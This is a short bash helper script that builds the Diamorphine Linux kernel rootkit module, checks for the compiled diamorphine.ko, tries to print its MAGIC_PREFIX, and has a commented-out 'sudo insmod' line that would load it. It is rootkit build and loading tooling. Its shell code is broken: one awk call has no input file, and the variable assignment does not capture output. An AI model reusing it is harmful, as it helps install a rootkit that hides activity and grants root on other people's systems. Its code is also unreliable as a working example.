#!/bin/bash
make
koFile=diamorphine.ko
cFile=diamorphine.c
if test -f "$koFile"; then #testing if .ko was built properly
    
    awk '/#define MAGIC_PREFIX/ {print $3}'
    mp=awk '/#define MAGIC_PREFIX/ {print $3}'
    echo "MP=$mp"

    #sudo insmod "$koFile"
    echo "built."

fi